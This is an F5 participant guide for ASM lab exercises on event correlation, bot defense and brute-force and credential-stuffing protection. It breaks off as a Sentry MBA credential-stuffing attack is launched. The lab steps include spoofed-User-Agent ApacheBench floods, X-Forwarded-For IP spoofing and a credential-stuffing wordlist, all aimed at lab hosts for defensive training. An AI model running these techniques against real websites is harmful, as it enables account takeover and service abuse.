ASM Lab Day - Vancouver

ASM – Advanced Mitigation Techniques

Participant Guide

|image0|

    Last Updated: 03/21/2018

©2017 F5 Networks, Inc. All rights reserved. F5, F5 Networks, and the F5
logo are trademarks of F5 Networks, Inc. in the U.S. and in certain
other countries. Other F5 trademarks are identified at f5.com.

Any other products, services, or company names referenced herein may be
trademarks of their respective owners with no endorsement or
affiliation, express or implied, claimed by F5.

These training materials and documentation are F5 Confidential
Information and are subject to the F5 Networks Reseller Agreement. You
may not share these training materials and documentation with any third
party without the express written permission of F5.

Table of Contents
=================

Table of Contents 2

Accessing the Lab 4

Lab 1 – Event Correlation 5

Exercise 1 – Run an Attack and View the Event Correlation Log 5

Lab 2 – Bot Signatures and Proactive Bot Defense 8

Exercise 1 – Bot Signatures 8

Exercise 2 – Using a Custom Bot Signature 11

Exercise 3 – Using Proactive Bot Defense 12

Exercise 4 – Blocking and Validating Suspicious Browsers 14

Lab 3 – Brute Force and Credential Stuffing 17

Exercise 1 – Configure Brute Force Protection 17

Exercise 2 – Blocking Brute Force of a Specific Device ID 20

Exercise 3 – Blocking Brute Force of a Specific IP Address 22

Exercise 4 – Blocking a Distributed Brute Force Attack 25

Exercise 5 – Blocking a Credential Stuffing Attack 29

Lab 4 – Protecting Credentials with F5 DataSafe 31

Exercise 1 – Review and Attack the Login Page 31

Exercise 2 – Review and Configure DataSafe Components 33

Exercise 3 – Testing DataSafe Protection 35

Exercise 4 – ASM Compatibility 36

Optional Lab 1 – Evasion Techniques 37

Exercise 1 – Setup and Determining Vulnerability 37

Exercise 2 – Testing ASM with Evasion Techniques 39

Optional Lab 2 – Protecting JSON Applications 47

Exercise 1 – Review the JSON Application 47

Exercise 2 – Manipulate JSON Request Data 48

Exercise 3 – Blocking Malicious JSON 49

Exercise 4 – ASM Content Profiles 51

Exercise 5 – JSON Format Validation 53

Optional Lab 3 – Cross Site Request Forgery Protection 55

Exercise 1 – Review the CSRF Attack Page 55

Exercise 2 – Configure CSRF Protection and Attack a Protected URL 56

*
*

Accessing the Lab

Task 1 – Access the Training Lab
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

You will be given a Lab Access Code and Student ID.

-  Visit https://training.f5agility.com/<Lab-Access-Code>/<Student-ID>/

|image1|

-  If the VM’s have not been started, click “Start” in the upper right
   corner.

    |image2|

-  When the environment has finished starting, you can access the
   Jumphost by clicking the rdp link and the BIG-IP via the https link.
   The credentials for either are as follows:

   -  Username: admin

   -  Password: admin

Lab 1 – Event Correlation

The purpose of this lab is to show the significant enhancements to ASM
Event Correlation in 13.1. You will run a script to simulate various
attacks. You will review these attacks in both the ASM Request log and
the Event Correlation screen.

Exercise 1 – Run an Attack and View the Event Correlation Log
=============================================================

Task 1 – Open the ASM Event Correlation Page
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  In the Configuration Utility, open the **Security > Event Logs >
   Application > Event Correlation** page.

You may already see some events from the previous exercises. Do NOT
select these for now, you can view them later.

-  Set the page to **Auto Refresh every 10 seconds**.

   |image3|

The **Event Correlation** page begins refreshing every 10 seconds.
Notice the blue countdown timer in the top right of the screen

Task 2 – Run the Attack Script
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  Open a command prompt move to the following location.

cd Desktop

-  Run the attack using the following command:

bash ec\_incidents\_all\_v1.sh

|image4|

The attack will begin running. Let it run for several seconds before
moving to the next task.

Task 3 – Review the Event Correlation Page – Patience required 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  In the Configuration Utility, review the **Event Correlation** page.

**→NOTE:** Do not select one of the incidents in the left panel; it will
stop auto refreshing the page. If that happens simply select the
incident again and the countdown timer will begin again.

It will take a couple minutes for the ASM event correlation to correlate
the individual requests in the log. After several refreshes you should
begin to see a few events.

-  Watch – DO NOT SELECT - the two **Malicious Session** – **Malicious
   Repetitive Access** events. Watch as these will change as the event
   correlation engine sees more violations from one of these two IP
   addresses.

-  After another few refreshes you will see even more events. After
   about 4 or 5 minutes you should have around 30 events listed.

   |image5|

| Notice that one of the **Malicious Sessions** has moved to the top of
  the list and now reads
| **Malicious Repetitive Access and more**.

Task 4 – Review Event Correlation Details
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  | Each incident on the **Event Correlation** page has an Incident
     type and an incident sub-type. For example there are several
     incidents with the type of **Vulnerability Scan**, but different
     sub-types, such as
   | **IBM Security AppScan Vulnerability Scan**, **Webinspect
     Vulnerability Scan**, and
   | **Qualys Vulnerability Scan**.

   |image6|

-  Select the top **Malicious Session** incident to view more details,
   and then click the **All Details** button.

-  Select the **Incident Subtype** list to see how many incident
   subtypes were sent in this malicious session.

   |image7|

-  Examine the other information on the **All Details** page.

Questions:

How long did this malicious session last?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

How many different requests were involved in the malicious session?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

How many of these requests were blocked?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

How many of these requests were blocked?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

Without the new event correlation feature it would be difficult would to
dig through all of the requests in the ASM request log and identify and
correlate the various attacks with which this IP address was involved.

In previous version ASM only correlated events from the same IP address
or to the same URL. ASM will now correlate based on IP address,
DeviceID, and various attack types.

-  Click the **Malicious Session** incident to deselect it.

| If enough time has passed, the **Incident Type Volume Grap**\ h will
  have updated to show you a
| high-level overview of the incident types.

-  Close the command prompt.

Lab 2 – Bot Signatures and Proactive Bot Defense

The purpose of this lab is to help you understand the bot detection and
mitigation features in application layer DoS Profiles. Also, to see the
new bot logging features in 13.0. You will detect and block bots with
increasing sophistication.

Exercise 1 – Bot Signatures 
============================

Task 2 – Configure a DoS Profile
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  Open Chrome and access the BIG-IP system at https://10.1.1.8. (NOTE:
   To make the exercises easier to perform we recommend restoring the
   Chrome window so it doesn’t take up the entire screen.)

-  In the Configuration Utility, open the **Security** > **DoS
   Protection > DoS Profiles** page and click **Create**.

-  Name the new profile **Bots-Lab** and click **Finished**.

-  Click **Bots-Lab**, and then open the **Application Security** page.

   |image8|

-  On the **General Settings** page click **Disabled** and then select
   the **Enabled** checkbox.

-  Click **TPS-based Detection**, then for **Operation Mode** select
   **Off**.

-  Click **Bot Signatures**, then click **Disabled**, then select the
   **Enabled** checkbox, and then click **Update**.

   |image9|

-  Open the **Virtual Server List** page and click
   **DVWA\_protected\_virtual**.

This virtual server is configured for **10.1.10.56** and listens on port
**80**.

**→NOTE:** The virtual server uses HTTP instead of HTTPS because one of
the DoS attack tools will be using don’t support SSL.

-  Open the virtual server **Security > Policies** page.

   |image10|

-  From the **DoS Protection Profile** list select **Enabled** and leave
   **Bots-Lab** selected and click **Update**.

Notice that there is a log publisher configured named
**ASM-Bot-DoS-Log-All**.

-  Open the **Security > Event Logs > Logging Profiles** page and click
   **ASM-Bot-DoS-Log-All**.

Notice this log profile includes **Application Security**, **Dos
Protection**, and **Bot Defense** logging.

Task 3 – Launch and Observe a Simple Bot Attack
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  Open a command prompt move to the following location.

cd C:\\xampp\\apache\\bin

|image11|

-  Use Apache Bench to attack the website using the following command:

ab -c 10 -n 10 -r http://10.1.10.56/

ApacheBench (ab) is a single-threaded command line computer program for
measuring the performance of HTTP web servers. The -c switch identifies
the number of multiple requests to make at one time. The -n switch
identifies the total number of requests, and the -r switch prevents the
command from exiting on socket receive errors.

-  In the Configuration Utility, navigate to **Security** > **Event Logs
   > Bot Defense** and right-click on **Requests**, and then select
   **Open Link in New Tab**.

**→NOTE:** When viewing the **Bot Defense** log you will need to scroll
to the right to see some of the fields.

-  In the new tab, examine the **Bot Defense** log.

   |image12|

In the Bot Defense logs we can see exactly WHO was blocked, HOW they
were blocked, and WHY they were blocked. This level of logging was only
available via iRules in previous versions and gives much greater
visibility into Bot Defense mitigations.

This is a “simple bot” and the DoS Profile could identify and block the
bot based on its signature, “ab” in the User-Agent HTTP header. In the
next exercise, we will change the User-Agent header and see if the DoS
Profile can block it.

Exercise 2 – Using a Custom Bot Signature 
==========================================

Task 1 – Launch an Unknown Bot Attack
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  In the command prompt copy and paste the following command:

ab -c 10 -n 10 -r -H "User-Agent: kalakalazoomzoom" http://10.1.10.56/

**→NOTE:** Make sure to issue the entire command on one line.

-  In the Configuration Utility, on the **Bot Defense > Requests** tab
   reload the page.

Food for Thought:

Was the attack blocked? Why or why not?

Task 2 – Create a New Bot Category and Bot Signature
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Create a new bot signature category, and then add a new bot signature
into the new category.

-  Navigate to **Security > Options > DoS Protection** and right-click
   on **Bot Signatures List**, and then select **Open Link in New Tab**.

-  In the new tab click **Create**.

-  Create a new bot signature using the following information, and then
   click **Create**, and then close the new tab. (NOTE: Copy and paste
   the string value.)

+-----------------------------+--------------------+
| **Name**                    | kalakalazoomzoom   |
+=============================+====================+
| **Category**                | DoS Tool           |
+-----------------------------+--------------------+
| **User-agent > contains**   | kalakalazoomzoom   |
+-----------------------------+--------------------+
| **Risk**                    | Medium             |
+-----------------------------+--------------------+

-  In the command prompt re-run the following command:

ab -c 10 -n 10 -r -H "User-Agent: kalakalazoomzoom" http://10.1.10.56/

-  In the Configuration Utility, on the **Bot Defense > Requests** tab
   reload the page.

   |image13|

The request was blocked because it matched the new custom signature.

Food for Thought:

| What if the script or bot uses a legitimate user agent string, such
  as:
| “Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101
  Firefox/40.1”?

| We can’t block using a signature or we’d block every legitimate
  browser using this browser
| or OS. How do we block these bots without using a signature?

Exercise 3 – Using Proactive Bot Defense 
=========================================

Task 1 – Enable Proactive Bot Defense protection
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Proactive Bot Defense detects bots and scripts, and prevents them from
accessing the site. It may be used to prevent DDoS, Web Scraping, and
Brute Force attacks.

-  | Navigate to **Security** > **DoS Protection** and right-click on
     **DoS Profiles**, and then
   | select **Open Link in New Tab**.

-  In the new tab click **Bots-Lab**, and then open the **Application
   Security** page.

-  Click **Proactive Bot Defense**, then click **Off**, then change
   **Operational Mode** to **Always**.

-  For **Block requests from suspicious browsers** click **Edit**.

-  Clear the **Block Suspicious Browsers** checkbox, and then click
   **Update**.

   |image14|

-  Change the Grace period to 60 seconds

   |image15|

-  In the command prompt copy and paste the following command, and then
   close the command prompt:

ab -c 10 -n 10 -r -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64;
rv:40.0) Gecko/20100101 Firefox/40.1" http://10.1.10.56/

**→NOTE:** Make sure to issue the entire command on one line and within
60 seconds from the dos profile update.

-  In the Configuration Utility, on the **Bot Defense > Requests** tab
   reload the page.

   |image16|

Question:

Which mitigation is being used?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

The DoS profile responded to the “bot” with a ‘simple challenge’ –
during the grace period ASM sends a redirect challenge (sending a
redirect message with a cookie). Note the **Reason** field. This field
gives descriptive explanation for why a challenge was (or was not)
possible. Proactive Bot Defense stops simple bots, even if they are
trying to impersonate legitimate browsers with a valid User-Agent
header, by responding with a JavaScript challenge.

-  Wait 60 seconds to let the grace timer expire. Then run the command
   again

ab -c 10 -n 10 -r -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64;
rv:40.0) Gecko/20100101 Firefox/40.1" http://10.1.10.56/

-  In the Configuration Utility, on the **Bot Defense > Requests** tab
   reload the page.

   |image17|

Question:

Which mitigation is being used?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

-  Open a browser and go to http://10.1.10.56/

-  In the Configuration Utility, on the **Bot Defense > Requests** tab
   reload the page.

   |image18|

Question:

Which mitigation is being used?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

Food for Thought:

What about JavaScript enabled bots or headless browsers like PhantomJS?
These bots are capable of processing JavaScript and will pass the
JavaScript challenge. How do we mitigate these types of bots?

Exercise 4 – Blocking and Validating Suspicious Browsers 
=========================================================

Task 1 – Edit the Proactive Bot Defense Settings
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  In the **DoS Profile** tab, click **Proactive Bot Defense**, then for
   **Block requests from suspicious browsers** click **Edit**.

-  Select the **Block Suspicious Browsers** checkbox, and then click
   **Update**.

   |image19|

-  Close the **Dos Profile** tab.

Task 2 – Access the Application using Suspicious Browsers
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  Open a **New** **incognito** **window** in Chrome.

   |image20|

-  Open the Chrome customization icon.

   |image21|

-  Open **More tools > Extensions**.

-  Click **Get more extensions**.

-  Search for **user agent switcher**, then for **User-Agent Switcher
   for Chrome** click **Add to Chrome**.

   |image22|

**→NOTE:** Make sure to use the User-Agent Switcher in the above image.

-  Click **Add extension**.

-  | Close the tab, and on the **Extensions** tab click for **User-Agent
     Switcher for Chrome** select the
   | **Allow in incognito** checkbox, and then close the **Extensions**
     tab.

-  Open a Chrome **incognito** window, and then click the **Chrome UA
   Spoofer** button.

   |image23|

-  Select **Safari > Mac Safari 7**.

   |image24|

This will force Chrome to send a User-Agent header that looks like it’s
coming from Safari on an Apple computer, even though we are actually
using Chrome on a Windows computer.

-  Access http://10.1.10.56.

   |image25|

You are presented with a CAPTCHA challenge.

-  Enter the CAPTCHA challenge (not case sensitive) and click **submit**
   to view the DVWA login page, and then close the window.

-  In the Configuration Utility, on the **Bot Defense > Requests** tab
   reload the page.

Proactive Bot Defense initially responded with the JavaScript challenge
which the browser (and any JS-enabled bot) could pass. The DoS profile
then sent the client capabilities challenge to validate the browser was
really Safari running on Mac OS X (since this is what the user-agent
header indicated). The response received by the BIGIP system is given a
score.

**Client Capabilities Scores**

| **0 – 59** = Browser = Allowed
| **60 – 99** = Suspicious = CAPTCHA Challenge
| **100** = BOT = Blocked

The browser received too high of a score and so was presented with the
CAPTCHA Challenge.

The CAPTCHA challenge will block even JS-enabled bots (AKA headless
browsers) but still let legitimate human users access the site.
Additionally, the CAPTCHA will only be presented if/when a browser does
not pass the capabilities challenge. Most browsers will pass this
challenge with a low enough score that most users will NOT even see the
CAPTCHA.

-  | Open a new **incognito** window and click the **Chrome UA Spoofer**
     button and select
   | **Internet Explorer > Internet Explorer 6**, and then access
     http://10.1.10.56.

-  When you begin receiving the error responses, close the window.

-  In the Configuration Utility, on the **Bot Defense > Requests** tab
   reload the page.

   |image26|

The request was blocked due to coming from a suspicious browser No
CAPTCHA challenge was presented.

-  Open a new **incognito** window and click the **Chrome UA Spoofer**
   button and select **Chrome > Default**, and then access
   http://10.1.10.56, and then close the DVWA page.

-  In the Configuration Utility, on the **Bot Defense > Requests** tab
   reload the page.

   |image27|

The request from Chrome passed the browser challenge and no CAPTCHA
challenge was presented.

-  Close the **Bot Defense > Requests** tab.

Lab 3 – Brute Force and Credential Stuffing

The purpose of this lab is to help you understand the significant
changes to the brute force detection and mitigation features and the
addition of known leaked credential stuffing detection in 13.1. You will
detect and block authentication attacks with increasing sophistication
and distribution. You will also use Sentry MBA to perform a credential
stuffing attack and then block it.

Exercise 1 – Configure Brute Force Protection 
==============================================

Task 1 – Review the Login Page to be Protected
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  Use Chrome to access http://hackazon.f5demo.com/user/login

-  Attempt to log in with your first name as **Username** any random
   string as **Password**.

-  Right-click inside the **Username or Email** field and select
   **Inspect Element**.

Question:

What is the **name** value for this field?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

-  Right-click inside the **Password** field and select **Inspect**.

Question:

What is the **name** value for this field?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

We will use this information to define the login page in the ASM policy.
We’ll then configure brute force and credential stuffing protections for
the login page

-  Close the developer tools window.

-  | Attempt to log in10 more times with your first name as **Username**
     and different random strings
   | as **Password**.

Questions:

What text displays on the failed login page?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

Were you able to try as many passwords as you wanted?
\_\_\_\_\_\_\_\_\_\_\_\_\_

You would be able to brute force this page by attempting thousands of
password combinations.

-  Close Chrome.

Task 2 – Define the Login Page
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  Open the **Application Security > Sessions and Logins > Login Pages
   List** page and click **Create**.

-  For **Login URL** leave **Explicit > HTTP** selected and start typing
   **/user/login**, and then select **/user/login** once it displays.

-  Configure the login page using the following information, and then
   click **Create**.

+-------------------------------------------------------+--------------------------------------+
| **Authentication Type**                               | HTML Form                            |
+=======================================================+======================================+
| **Username Parameter Value**                          | username                             |
+-------------------------------------------------------+--------------------------------------+
| **Password Parameter Value**                          | password                             |
+-------------------------------------------------------+--------------------------------------+
| **A string that should NOT appear in the response**   | Username or password are incorrect   |
+-------------------------------------------------------+--------------------------------------+

|image28|

-  Save and apply the policy

Task 3 – Register a username and test 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  Open http://hackazon.f5demo.com/user/register

-  Register a new username –

   -  Username: username1

   -  Password: username1

-  Open a new chrome window, log in with the new credentials and verify
   you are able to log in.

-  Open event log, clear the ‘illegal request’ filter and look for your
   request.

|image29|

Task 4 – Configure Brute Force Protection
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  | Open the **Application Security > Anomaly Detection > Brute Force
     Attack Prevention** page and
   | click **Create**.

-  For **Login Page** select **[HTTP]/user/login**.

-  In the **Source-based Brute Force Protection** section configure the
   following:

+-----------------------------------------------+---------------------------------+
| **Detection Period**                          | 10 Minutes                      |
+===============================================+=================================+
| **Maximum Prevention Duration**               | 2 Minutes                       |
+-----------------------------------------------+---------------------------------+
| **Username**                                  | After 3 failed login attempts   |
+-----------------------------------------------+---------------------------------+
| **Device ID**                                 | Never                           |
+-----------------------------------------------+---------------------------------+
| **IP Address**                                | Never                           |
+-----------------------------------------------+---------------------------------+
| **Client Side Integrity Bypass Mitigation**   | Never                           |
+-----------------------------------------------+---------------------------------+
| **CAPTCHA Bypass Mitigation**                 | Never                           |
+-----------------------------------------------+---------------------------------+

-  In the **Distributed Brute Force Protection** section configure the
   following, and then click **Create**.

+-----------------------------------+--------------+
| **Detection Period**              | 15 Minutes   |
+===================================+==============+
| **Maximum Prevention Duration**   | 60 Minutes   |
+-----------------------------------+--------------+
| **Detect Distributed Attack**     | Never        |
+-----------------------------------+--------------+
| **Detect Credential Stuffing**    | Never        |
+-----------------------------------+--------------+

-  Click **Apply Policy** and then **OK**.

Exercise 2 – Blocking Brute Force of a Specific Device ID 
==========================================================

Task 1 – Enable Brute Force Device ID Protection
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  In the **Brute Force Attack Prevention** tab click **[HTTP]
   /user/login**.

-  For **Device ID** select the **After** option and leave the default
   of **3** failed login attempts.

   |image30|

-  Click **Save**, then click **Apply Policy** and then **OK**.

Task 2 – Enter Different Credentials in the Hackazon Login Page
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  Use a new Chrome window to access
   http://hackazon.f5demo.com/user/login.

-  Reload the page 15 times.

This is because ASM must “qualify” the URL before injecting the Device
ID JavaScript. After it’s qualified you should see a blank page for a
second.

-  Attempt to log in with any value for **Username** any random string
   as **Password**.

-  | Continue to attempt to log in with different values for
     **Username** and different random strings
   | as **Password**.

**→NOTE:** It’s important that you use different usernames for each
login attempt.

Question:

| How many times were you able to attempt to login before getting the
  CAPTCHA challenge?
| \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

-  Complete the CAPTCHA challenge.

You are returned to the login page.

-  Try one more login attempt with a random username and password.

You are immediately presented with the CAPTCHA challenge.

-  Complete the CAPTCHA challenge, and then close Chrome.

Task 3– Review Requests in the ASM Log
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  In the Configuration Utility, on the **Application > Requests** page
   select **Refresh**.

-  Select the most recent blocked log entry.

**→NOTE:** If you do not see a new blocked request then you may have not
completed the CAPTCHA. CAPTCHA-challenged requests are not logged until
completed. If this is the case, return to the Hackazon login page and
complete the CAPTCHA. If you did not complete the CAPTCHA soon enough it
may STILL not be logged. In that case, try additional logins until you
are blocked. However, you may receive the blocking page rather than the
CAPTCHA.

-  Click **Brute Force: Maximum login attempts are exceeded**.

Questions:

What is the **Mitigated Action**? \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

What is the **Device ID**?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

-  View the first 15 log entries and examine the **Device ID** value on
   the **All Details** page.

Question:

| Why don’t the first 10 or so log entries have a **Device ID** value?
| \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

Is the **Device ID** the same for the rest of the log entries?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

In many cases it is not possible or desirable to inject the JavaScript
necessary to collect a Device ID. In that case ASM can still detect this
type of attack by IP address.

-  Select the checkbox to select all the log entries, and then click
       **Delete Requests**.

Exercise 3 – Blocking Brute Force of a Specific IP Address 
===========================================================

Task 1 – Enable Brute Force IP Address Protection
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  In the **Brute Force Attack Prevention** tab click **[HTTP]
   /user/login**.

-  For **Device ID** select the **Never** option.

-  For **IP Address** select the **After** option and use **7** failed
   login attempts.

If the attacker can bypass the CAPTCHA challenge, we want to completely
block the attacker rather than continuing to send CAPTCHA challenges.
However, we want to make it very difficult for the attacker to know he
is getting blocked, so we will present him with a honeypot page that
exactly mimics the Hackazon failed login screen.

-  For **CAPTCHA Bypass Mitigation**, select the **After** option and
   use **3** failed login attempts.

-  Change the **Action** to **Alarm and Honeypot Page**.

   |image31|

-  Click **Save**, then click **Apply Policy** and then **OK**.

Task 2 – Review the Honeypot Page Configuration
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  Navigate to **Security > Application Security > Policy** and
   right-click on **Response Page**, and then select **Open Link in New
   Tab**.

-  In the new tab, on the left menu select **Failed Login Honeypot**.

This custom response page has already been configured to exactly mimic
the Hackazon failed login page with a slight modification.

**→NOTE:** A couple of minor changes have been made to the page so that
you MAY be able to see when you are getting this Honeypot page. See if
you can tell what those changes are once you start the attack in the
next step.

-  Close the **Response Pages** tab.

Task 3 – Enter Different Credentials in the Hackazon Login Page
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  Use a new Chrome window to access
   http://hackazon.f5demo.com/user/login.

-  Reload the page 15 times.

-  Attempt to log in with any value for **Username** any random string
   as **Password**.

-  | Continue to attempt to log in with different values for
     **Username** and different random strings
   | as **Password**.

Question:

| How many times were you able to attempt to login before getting the
  CAPTCHA challenge?
| \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

-  Complete the CATPTCH challenge.

You are returned to the login page.

-  Attempt additional logins and complete the CAPTCHA challenges. See if
   you can identify when you are receiving the honeypot page. (HINT:
   Watch the username field.)

-  Close Chrome.

Task 4– Review Requests in the ASM Log
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  In the Configuration Utility, on the **Application > Requests** page
   select **Refresh**.

There should be several legal requests followed by some illegal
requests, and then some blocked requests. The number of blocked requests
depends on how long it took you to realize you were receiving the
honeypot page.

-  Select the first illegal log entry |image32| (the lowest in the list)
       and view the **All Details** page.

Questions:

What is the **Request Status**? \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

| Why was the CAPTCHA challenged request not reported as blocked?
| \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

-  Click **Brute Force: Maximum login attempts are exceeded**.

Questions:

What is the **Mitigated Action**? \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

What is the **Client IP Address**?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

-  Select the most recent blocked |image33|\ log entry and view the
   **All Details** page.

Questions:

What is the **Request Status**? \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

Why does this request report as blocked?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

Why is the **Login Result** unknown?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

-  Click **Brute Force: Maximum login attempts are exceeded**.

Questions:

What is the **Mitigated Action**? \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

Why has the **Mitigation Action** changed?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

What is the **Client IP Address**?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

What additional threshold value is now being reported?
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

This is still part of the attack from the client IP **10.1.10.4**.

In a true distributed credential stuffing attack the attacker is coming
from many different IP addresses and using many different usernames.
None of the detection methods we have used to this point would be able
to detect this type of attack. To mitigate this attack, we will need to
enable distributed attack detection.

-  Select the checkbox to select all the log entries, and then click
       **Delete Requests**.

Exercise 4 – Blocking a Distributed Brute Force Attack
======================================================

Task 1 – Enable Brute Force Distributed IP Address Protection
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  In the **Brute Force Attack Prevention** tab click **[HTTP]
   /user/login**.

-  In the **Distributed Brute Force Protection** section, change
   **Maximum Prevention Duration** to **5** minutes.

-  For **Detect Distributed Attack** select the **After** option and use
   **50** failed login attempts.

   |image34|

-  Click **Save**, then click **Apply Policy** and then **OK**.

Task 2 – Apply the XFF iRule to the Virtual Server
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  Navigate to **Local Traffic > iRules** and right-click on **iRule
   List**, and then select **Open Link in New Tab**.

-  In the new tab go to the second page, and then click
   **rule\_insert-XFF**.

This iRule will inject random IP addresses in an **X-Forwarded-For**
header. This will allow us to make the attack appear to be distributed
across many IP addresses.

-  | Open the **Virtual Server List** page and click
     **Hackazon\_protected\_virtual**, and then open
   | the **Resources** page.

-  For **iRules** click **Manage**, then add **rule\_insert-XFF** to the
   virtual server, and then click **Finished**.

-  Open the **Security > Application Security > Policy > Properties**
   page.

-  From the **Policy Properties** list select **Advanced**.

-  Select the **Trust XFF Header** checkbox.

   |image35|

This setting will enable ASM to use the **X-Forwarded-For** value (from
the iRule) as the IP address of the incoming request.

-  Click **Save**, then click **Apply Policy** and then **OK**, and then
   close the tab.

Task 3 – Review Sentry MBA Configuration
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Sentry MBA is a tool that “crackers” use to try to replay stolen
credentials against login pages that they want to compromise. As you
will see from this lab it is highly configurable and it is widely used
on the internet for credential stuffing attacks.

-  Open **Burp Suite**.

-  Click **Close** to bypass installing updates, then click **Next**,
   and then click **Start Burp**.

-  Select the **Proxy** tab, and then click **Intercept is on** (ensure
   that it reads **Intercept is off**). NOTE: Leave Burn Suite running
   through this exercise.

   |image36|

-  Open **Sentry MBA** by clicking the blue “\ **S**\ ” in the taskbar.

   |image37|

Sentry MBA is already configured to attack the Hackazon login page.
We’ll examine the tool settings to see how it is configured.

-  In **Sentry MBA**, examine the URL in the **Site** list.

-  From the left menu select **Settings > HTTP Header**.

-  Click the “magic wand” icon on the lower right corner.

   |image38|

-  Examine the configuration settings on this page.

**→NOTE:** DO NOT change any of the settings on this page.

-  Close the page using the **X** in the top right corner.

-  From the left menu select **Lists > Wordlist**.

These are the **username:password** credentials that will be “stuffed”
into the Hackazon login page. In practice, these might be tens of
thousands of stolen credentials from breaches like the Sony, Target,
Home Depot, or Yahoo breaches.

-  Scroll through the list and identify the **admin:admin** and
   **user1:user1** entries. They are in positions 20 and 24 in the list.

Task 4 – Launch a Distributed Attack
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  In **Sentry MBA** click **Go**.

-  Select the **Use the Progression Position** checkbox.

   |image39|

-  Click **Start the Bruteforcer Engine!**

The attack starts and you will quickly see in the **Hits** tab that
